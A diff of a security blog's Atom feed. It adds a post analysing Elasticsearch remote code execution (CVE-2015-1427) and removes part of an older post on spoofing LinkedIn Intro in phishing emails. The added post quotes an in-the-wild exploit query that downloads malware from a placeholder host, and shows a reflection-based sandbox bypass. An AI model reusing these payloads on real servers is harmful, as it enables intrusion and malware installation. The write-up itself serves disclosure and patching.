@@ -4,7 +4,7 @@
   <title><![CDATA[jordan-wright]]></title>
   <link href="http://jordan-wright.github.io/atom.xml" rel="self"/>
   <link href="http://jordan-wright.github.io/"/>
-  <updated>2015-02-28T17:56:57-06:00</updated>
+  <updated>2015-03-08T13:36:33-05:00</updated>
   <id>http://jordan-wright.github.io/</id>
   <author>
     <name><![CDATA[Jordan]]></name>
@@ -12,6 +12,206 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Remote Code Execution in Elasticsearch - CVE-2015-1427]]></title>
+    <link href="http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/"/>
+    <updated>2015-03-08T13:40:00-05:00</updated>
+    <id>http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427</id>
+    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/elk_rce.png"/></p>
+
+<blockquote><p>TL;DR If you have an elasticsearch instance that is publicly available, upgrade to 1.4.3 or later <strong>now</strong>.</p></blockquote>
+
+<p>Elasticsearch (the &ldquo;E&rdquo; in ELK) is a full-text search engine that makes data aggregation and querying easy. It has an extensive JSON API that allows everything from searching to system management. This post will show how a new vulnerability, CVE-2015-1427, allows attackers to leverage features of this API to gain unauthenticated remote code execution (RCE).</p>
+
+<blockquote><p>Much of the analysis discovering this vulnerability was originally found on a blog post <a href="http://drops.wooyun.org/papers/5107">here</a> (<a href="https://translate.google.com/translate?hl=en&amp;sl=zh-CN&amp;tl=en&amp;u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F5107">translated</a>). This post aims to translate and provide more detail on the vulnerability.</p></blockquote>
+
+<!--more-->
+
+
+<h3>This Isn&rsquo;t Elasticsearch&rsquo;s First Rodeo</h3>
+
+<p>One feature of the <code>_search</code> API endpoint is to allow users to <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html">submit Groovy code</a> in the search query itself. The server will then execute the code in a sandboxed environment, returning the result to the user. This way, the elasticsearch code can be used to execute&hellip; more code<sup>1</sup></p>
+
+<p>Allowing anybody to submit server-side code to get executed is a <em>dangerous</em> game to play. In fact, this isn&rsquo;t the first time Elasticsearch has been bitten by this feature. Elasticsearch pre-1.2 didn&rsquo;t have a sandbox <em>at all</em>, and allowed anyone to submit code to be executed. Since there are zero authentication controls built into elasticsearch, if the service is exposed to the Internet, anyone can own a server with a query like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>{"query":
+</span><span class='line'>    {"filtered": {
+</span><span class='line'>        "query": {"match_all": {}}}},
+</span><span class='line'>        "script_fields": {"exp": {
+</span><span class='line'>            "script": "import java.util.*;import java.io.*;String str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -O /tmp/malware http://x.x.x.x/malware \").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"
+</span><span class='line'>    }}}</span></code></pre></td></tr></table></div></figure>
+
+
+<blockquote><p>Fun fact! This is an actual exploit attempt I&rsquo;ve seen on my server.</p></blockquote>
+
+<p>This isn&rsquo;t anything new. In fact, there&rsquo;s a <a href="http://www.rapid7.com/db/modules/exploit/multi/elasticsearch/script_mvel_rce">Metasploit module</a> that makes this easy.</p>
+
+<p>Starting with version 1.3, Elasticsearch <a href="http://www.elasticsearch.org/blog/scripting/">allowed sending Groovy scripts</a> in the query again. However, they added a sandbox to control what classes and functions can be executed.</p>
+
+<p>Let&rsquo;s take a quick look at how the sandbox works to get a feel for how it can be exploited.</p>
+
+<h3>How the Sandbox Works</h3>
+
+<p>The functions and classes that are allowed by the sandbox are found in <a href="https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/script/groovy/GroovySandboxExpressionChecker.java"><code>GroovySandboxExpressionChecker.java</code></a>. Looking at the code, we notice the function <code>isAuthorized</code>. This function takes in an expression and checks to see if it is allowed to be executed.</p>
+
+<p>Without going through <strong>everything</strong> the sandbox does, here&rsquo;s the important part of the function:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">expression</span> <span class="k">instanceof</span> <span class="n">MethodCallExpression</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>    <span class="n">MethodCallExpression</span> <span class="n">mce</span> <span class="o">=</span> <span class="o">(</span><span class="n">MethodCallExpression</span><span class="o">)</span> <span class="n">expression</span><span class="o">;</span>
+</span><span class='line'>    <span class="n">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">mce</span><span class="o">.</span><span class="na">getMethodAsString</span><span class="o">();</span>
+</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">methodBlacklist</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">methodName</span><span class="o">))</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+</span><span class='line'>    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">methodName</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">mce</span><span class="o">.</span><span class="na">getMethod</span><span class="o">()</span> <span class="k">instanceof</span> <span class="n">GStringExpression</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="c1">// We do not allow GStrings for method invocation, they are a security risk</span>
+</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'>    <span class="c1">//snip</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is the condition that checks to see if our method call is allowed to be executed. There are two checks we need to bypass in order to make this happen:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">methodBlacklist</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">methodName</span><span class="o">))</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>methodBlacklist</code> contains the following method calls that we can&rsquo;t use:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span><span class="o">[]</span> <span class="n">defaultMethodBlacklist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span>
+</span><span class='line'>    <span class="s">&quot;getClass&quot;</span><span class="o">,</span>
+</span><span class='line'>    <span class="s">&quot;wait&quot;</span><span class="o">,</span>
+</span><span class='line'>    <span class="s">&quot;notify&quot;</span><span class="o">,</span>
+</span><span class='line'>    <span class="s">&quot;notifyAll&quot;</span><span class="o">,</span>
+</span><span class='line'>    <span class="s">&quot;finalize&quot;</span>
+</span><span class='line'><span class="o">};</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, so we can&rsquo;t use any of those. Next, we need to make sure that our method name isn&rsquo;t null, and we don&rsquo;t use a <a href="http://groovy.codehaus.org/api/org/codehaus/groovy/ast/expr/GStringExpression.html"><code>GStringExpression</code></a>. No problem.</p>
+
+<p>There&rsquo;s one more hurdle that we have to overcome. This sandbox also restricts the packages that can have methods called on them (from <a href="https://github.com/groovy/groovy-core/blob/0b2182bff2250150e69ccb988f367e709b4560de/src/main/org/codehaus/groovy/control/customizers/SecureASTCustomizer.java#L854"><code>SecureASTCustomizer.java</code></a>):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">receiversWhiteList</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">receiversWhiteList</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">typeName</span><span class="o">))</span> <span class="o">{</span>
+</span><span class='line'>    <span class="k">throw</span> <span class="k">new</span> <span class="nf">SecurityException</span><span class="o">(</span><span class="s">&quot;Method calls not allowed on [&quot;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&quot;]&quot;</span><span class="o">);</span>
+</span><span class='line'><span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">receiversBlackList</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">receiversBlackList</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">typeName</span><span class="o">))</span> <span class="o">{</span>
+</span><span class='line'>    <span class="k">throw</span> <span class="k">new</span> <span class="nf">SecurityException</span><span class="o">(</span><span class="s">&quot;Method calls not allowed on [&quot;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&quot;]&quot;</span><span class="o">);</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The whitelist for elasticsearch is found in the variable <code>defaultReceiverWhitelist</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kd">final</span> <span class="kd">static</span> <span class="n">String</span><span class="o">[]</span> <span class="n">defaultReceiverWhitelist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span> <span class="o">[]</span> <span class="o">{</span>
+</span><span class='line'>    <span class="n">groovy</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">GroovyCollections</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
+</span><span class='line'>    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Math</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
+</span><span class='line'>    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Integer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="s">&quot;[I&quot;</span><span class="o">,</span> <span class="s">&quot;[[I&quot;</span><span class="o">,</span> <span class="s">&quot;[[[I&quot;</span><span class="o">,</span>
+</span><span class='line'>    <span class="c1">//snip</span>
+</span><span class='line'><span class="o">};</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On the surface, this eliminates our ability to call any methods on interesting packages, such as <code>java.lang.Runtime</code>, which could be used to execute system commands. However, there&rsquo;s a way we can bypass both the package whitelist and the method blacklist to execute our code. This is done through a tricky Java feature called <a href="http://docs.oracle.com/javase/tutorial/reflect/"><code>reflection</code></a>.</p>
+
+<h3>Bypassing the Sandbox with Reflection</h3>
+
+<p>Vulnerabilities can often be reverse-engineered by inspecting the patches since the previous release. The commit that we will look at is <a href="https://github.com/elasticsearch/elasticsearch/commit/68c4a6201e6c889b272c1b64550237fe6d172b47">here</a>. The changes in this commit give us some hints about how we can exploit the vulnerability:</p>
+
+<p><img src="http://jordan-wright.github.io/images/blog/elk/rce.png"/></p>
+
+<p>This makes it pretty clear that we can probably do something with the <code>.class</code> and <code>.forName()</code> method calls. These methods, chained together, allow us to take one package class (such as one found in the whitelist) and use it to load a reference to a completely separate class (such as <code>java.lang.Runtime</code>) via reflection.</p>
+
+<p>So what does this look like?</p>
+
+<p>Let&rsquo;s see if we can load the <code>java.lang.Runtime</code> package by using reflection off of the <code>java.lang.Math</code> package, which is in the whitelist of packages we can use:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>$ curl http://localhost:9200/_search?pretty -XPOST -d &#39;{&quot;script_fields&quot;: {&quot;myscript&quot;: {&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;)&quot;}}}&#39;
+</span><span class='line'>
+</span><span class='line'>{
+</span><span class='line'>  &lt;snip&gt;
+</span><span class='line'>  &quot;hits&quot; : {
+</span><span class='line'>    &quot;total&quot; : 8,
+</span><span class='line'>    &quot;max_score&quot; : 1.0,
+</span><span class='line'>    &quot;hits&quot; : [ {
+</span><span class='line'>      &lt;snip&gt;
+</span><span class='line'>      &quot;fields&quot; : {
+</span><span class='line'>        &quot;myscript&quot; : [ &quot;class java.lang.Runtime&quot; ]
+</span><span class='line'>      }
+</span><span class='line'>    }
+</span><span class='line'>}}
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>Success!</em> We can see the result of our query returned an instance of the <code>java.lang.Runtime</code> class. We can use this instance to execute system commands on the server.</p>
+
+<p>I won&rsquo;t provide a full proof-of-concept, but all the pieces are here. Using a mix of the first exploit shown above along with the way I&rsquo;ve shown to get a reference to the <code>java.lang.Runtime</code> package, it is pretty straightforward to run whatever commands you want.</p>
+
+<h3>Conclusion</h3>
+
+<p>This vulnerability was not heavily advertised, but it is absolutely critical. In fact, I had one of my own elasticsearch instances compromised this way, showing this vulnerability is heavily being exploited in the wild.</p>
+
+<p>Elasticsearch recommends to only allow the software to be accessed locally, but there are a <em>ton</em> of publicly available ES instances. This is likely because the default configuration listens on <code>0.0.0.0:9200</code>.</p>
+
+<p>If you use elasticsearch, and haven&rsquo;t upgraded to 1.4.3 (or the latest 1.4.4), I recommend upgrading <strong>immediately</strong>.</p>
+
+<p>As always, let me know if you have any questions or comments below!</p>
+
+<p>Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>
+
+<p><sup>1</sup> There&rsquo;s an Xzibit joke to be made here.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[How Tor Works: Part One]]></title>
@@ -3418,230 +3618,6 @@ e= new Vivus('network', {type: 'oneByOne', duration: 30, start: 'inViewport', fo
 
 
 <p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Phishing with Linkedin's Intro]]></title>
-    <link href="http://jordan-wright.github.io/blog/2013/10/26/phishing-with-linkedins-intro/"/>
-    <updated>2013-10-26T19:21:00-05:00</updated>
-    <id>http://jordan-wright.github.io/blog/2013/10/26/phishing-with-linkedins-intro</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/linkedin_phish.png"/></p>
-
-<p><em>Update 10/28/2013 6:30PM CDT &ndash; I have been in contact with Linkedin&rsquo;s security team and a hotfix has recently been released to address the findings below. This fix applies the styling rules to a randomly generated ID, as opposed to the class based styling seen below. This provides more specificity in applying the rules, making it more difficult to override.</em></p>
-
-<p><em>I am no CSS expert so there could very well be tricks to still get around this and remove the content (or even just hide it and overlap it) &ndash; <a href="http://jordan-wright.github.io/contact">email me</a> if you know of one! I will be continuing my work with Linkedin&rsquo;s security team to iron out any bugs we can find. Users are reminded that no solution is perfect, and that seeing this data in an email in no way definitively proves the senders legitimacy.</em></p>
-
-<p><em>I would also like to thank Linkedin&rsquo;s security team for their quick and effective response to these findings.</em></p>
-
-<h3>&ldquo;Intro&#8221;duction</h3>
-
-<p>On October 23, Linkedin introduced an application called <a href="http://blog.linkedin.com/2013/10/23/announcing-linkedin-intro/">&ldquo;Intro&rdquo;</a>. The premise is simple: allow iPhone users to see details about the people they are emailing within the native iPhone Mail App. Think <a href="http://rapportive.com/">Rapportive</a> for the iPhone Mail App, because that&rsquo;s <em>essentially</em> what this is (and made by the same people).</p>
-
-<p>However, when reading the initial description of Intro, there was one part that caught my eye:</p>
-
-<blockquote><p>David says Crosswise would love to work with you. Is this spam, or the real deal?</p>
-
-<p>With Intro, you can immediately see what David looks like, where he’s based, and what he does. You can see that he’s the CEO of Crosswise. This is the real deal.</p></blockquote>
-
-<p>This is not much different than Linkedin saying &ldquo;we&rsquo;ve put a picture of a lock in your email, so you know for sure it&rsquo;s secure&rdquo;. Linkedin is simply giving its users a false sense of security. In this post, we&rsquo;ll take a look and see what <em>exactly</em> Linkedin is doing to its users&#8217; email, as well as how we can spoof this information, gaining full control of the information shown to the user.</p>
-
-<!-- more -->
-
-
-<h3>What Linkedin Does to Your Email</h3>
-
-<p>While I am currently performing a much more in-depth analysis of Intro which will give a much better look into its behavior (to be posted soon), for now we will just take a look at the basics of how Intro works, and look specifically into how it manipulates user&rsquo;s email.</p>
-
-<p>Intro works by first obtaining an OAuth access token to manage your email. They can get away with not asking for your Gmail password since <a href="https://developers.google.com/gmail/oauth_overview">Google implemented OAuth support into Gmail&rsquo;s IMAP and SMTP</a>. After Linkedin can access your email, they install a security profile onto your iPhone. The most notable feature of this security profile is that it installs a new email account pointing to Linkedin&rsquo;s IMAP and SMTP servers. I&rsquo;m not sure of a way to recover the email account password from the iPhone itself, but by intercepting the profile sent to the iPhone via a proxy, we can see that this email account looks like this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;dict&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadDisplayName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>Email Settings<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadType<span class="nt">&lt;/key&gt;&lt;string&gt;</span>com.apple.mail.managed<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadVersion<span class="nt">&lt;/key&gt;&lt;integer&gt;</span>1<span class="nt">&lt;/integer&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadUUID<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[redacted]<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadIdentifier<span class="nt">&lt;/key&gt;&lt;string&gt;</span>com.rapportive.iphone.settings.email.[redacted]<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAccountName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>Test Account<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAccountType<span class="nt">&lt;/key&gt;&lt;string&gt;</span>EmailTypeIMAP<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAddress<span class="nt">&lt;/key&gt;&lt;string&gt;</span>linkedin.intro.test@gmail.com<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAccountDescription<span class="nt">&lt;/key&gt;&lt;string&gt;</span>Gmail +Intro<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerAuthentication<span class="nt">&lt;/key&gt;&lt;string&gt;</span>EmailAuthPassword<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerHostName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>imap.intro.linkedin.com<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerPortNumber<span class="nt">&lt;/key&gt;&lt;integer&gt;</span>143<span class="nt">&lt;/integer&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerUseSSL<span class="nt">&lt;/key&gt;&lt;true/&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerUsername<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[username_redacted]<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingPassword<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[password_redacted]<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingPasswordSameAsIncomingPassword<span class="nt">&lt;/key&gt;&lt;true/&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerAuthentication<span class="nt">&lt;/key&gt;&lt;string&gt;</span>EmailAuthPassword<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerHostName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>smtp.intro.linkedin.com<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerPortNumber<span class="nt">&lt;/key&gt;&lt;integer&gt;</span>587<span class="nt">&lt;/integer&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerUseSSL<span class="nt">&lt;/key&gt;&lt;true/&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerUsername<span class="nt">&lt;/key&gt;&lt;string&gt;</span> Gmail +Intro ?[username_redacted]<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingPassword<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[password_redacted]<span class="nt">&lt;/string&gt;</span>
-</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>By intercepting the profile, we can get the username and password used to log into Linkedin&rsquo;s IMAP (imap.intro.linkedin.com) and SMTP (smtp.intro.linkedin.com) services. The username was a base64 encoded string, and the password was a 32 character hash.</p>
-
-<p>Here&rsquo;s a diagram of how this works:</p>
-
-<p><a href="http://jordan-wright.github.io/images/blog/intro_phish/diagram.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/intro_phish/diagram.png"/></a></p>
-
-<p>Now that we have the username and password used for this mail account, let&rsquo;s grab the first email and see what content Linkedin&rsquo;s IMAP proxy injects into it. We can do this with OpenSSL.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class='xml'><span class='line'># openssl s_client -connect imap.intro.linkedin.com:143 -starttls imap -crlf -quiet
-</span><span class='line'>depth=2 C = US, O = &quot;thawte, Inc.&quot;, OU = Certification Services Division, OU = &quot;(c) 2006 thawte, Inc. - For authorized use only&quot;, CN = thawte Primary Root CA
-</span><span class='line'>verify error:num=19:self signed certificate in certificate chain
-</span><span class='line'>verify return:0
-</span><span class='line'>. OK More capabilities after LOGIN
-</span><span class='line'>a LOGIN username_redacted password_redacted
-</span><span class='line'>* CAPABILITY IMAP4rev1 IDLE NAMESPACE ID CHILDREN UIDPLUS COMPRESS=DEFLATE
-</span><span class='line'>A OK linkedin.intro.test@gmail.com Test Account authenticated (Success)
-</span><span class='line'>b SELECT INBOX
-</span><span class='line'>* FLAGS (\Answered \Flagged \Draft \Deleted \Seen)
-</span><span class='line'>* OK [PERMANENTFLAGS (\Answered \Flagged \Draft \Deleted \Seen \*)] Flags permitted.
-</span><span class='line'>* OK [UIDVALIDITY 1] UIDs valid.
-</span><span class='line'>* 4 EXISTS
-</span><span class='line'>* 0 RECENT
-</span><span class='line'>* OK [UIDNEXT 5] Predicted next UID.
-</span><span class='line'>* OK [HIGHESTMODSEQ 1049]
-</span><span class='line'>b OK [READ-WRITE] INBOX selected. (Success)
-</span><span class='line'>c FETCH 4 BODY[]
-</span><span class='line'>* 4 FETCH (FLAGS (\Seen) BODY[] {36510}
-</span><span class='line'>email_content_here
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>As it turns out, Linkedin injects quite a bit of content into your email. The basic structure looks like this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/REC-html40/loose.dtd&quot;&gt;</span>
-</span><span class='line'><span class="nt">&lt;html&gt;</span>
-</span><span class='line'>  <span class="nt">&lt;head&gt;</span>
-</span><span class='line'>      <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;Content-Type&quot;</span> <span class="na">content=</span><span class="s">&quot;text/html; charset=utf-8&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'>      User specified CSS (if any)
-</span><span class='line'>      <span class="nt">&lt;style </span><span class="na">type=</span><span class="s">&quot;text/css&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'>          <span class="c">/*BEGIN RAPPORTIVE*/</span>
-</span><span class='line'>          <span class="nt">Injected</span> <span class="nt">Linkedin</span> <span class="nt">Intro</span> <span class="nt">CSS</span>
-</span><span class='line'>          <span class="c">/*END RAPPORTIVE*/</span>
-</span><span class='line'>      <span class="nt">&lt;/style&gt;</span>
-</span><span class='line'>  <span class="nt">&lt;/head&gt;</span>
-</span><span class='line'>  <span class="nt">&lt;body&gt;</span>
-</span><span class='line'>      <span class="c">&lt;!--BEGIN RAPPORTIVE--&gt;</span>
-</span><span class='line'>      Injected Linkedin Intro HTML Content
-</span><span class='line'>      <span class="c">&lt;!--END RAPPORTIVE--&gt;</span>
-</span><span class='line'>      Original Message
-</span><span class='line'>  <span class="nt">&lt;/body&gt;</span>
-</span><span class='line'><span class="nt">&lt;/html&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>You can find the full email <a href="https://gist.github.com/jordan-wright/7189765#file-original_email-html">here</a> (some links and what-not have been redacted). Now that we know what Linkedin does to the email, let&rsquo;s see how we can use it to make our phishing emails appear to be legitimate.</p>
-
-<h3>Setting up the Bait</h3>
-
